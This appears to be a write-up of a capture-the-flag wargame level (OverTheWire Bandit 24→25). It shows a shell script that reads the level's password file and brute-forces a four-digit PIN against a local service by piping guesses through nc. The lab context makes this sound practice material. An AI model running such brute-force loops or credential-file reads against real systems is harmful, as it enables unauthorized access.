# Level 24 → Level 25

```bash
bandit24@bandit:~$ mktemp
/tmp/tmp.7sI8zVBRJr

bandit24@bandit:~$ nano /tmp/tmp.7sI8zVBRJr
```

```bash
PASS=$(cat /etc/bandit_pass/bandit24)

for i in $(seq -w 0000 9999); do echo "$PASS $i"; done | nc localhost 30002 > result.txt
grep -v "Wrong" result.txt
```

```bash
bandit24@bandit:~$ chmod 777 /tmp/tmp.7sI8zVBRJr

bandit24@bandit:~$ /tmp/tmp.7sI8zVBRJr

I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is
```